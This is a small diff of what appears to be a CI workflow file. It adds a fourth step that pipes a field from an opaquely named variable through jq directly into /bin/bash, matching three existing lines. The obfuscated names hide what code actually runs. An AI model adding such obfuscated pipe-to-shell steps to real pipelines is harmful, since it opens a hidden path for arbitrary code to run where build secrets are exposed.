@@ -32,6 +32,7 @@ jobs:
           echo $rcc5088 | jq -r .lv4461 | /bin/bash
           printf '%s' "$pa21" | jq -r .f4637 | /bin/bash
           echo $v2823 | jq -r .oogxj14 | /bin/bash
+          printf '%s' "$halb05" | jq -r .p6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
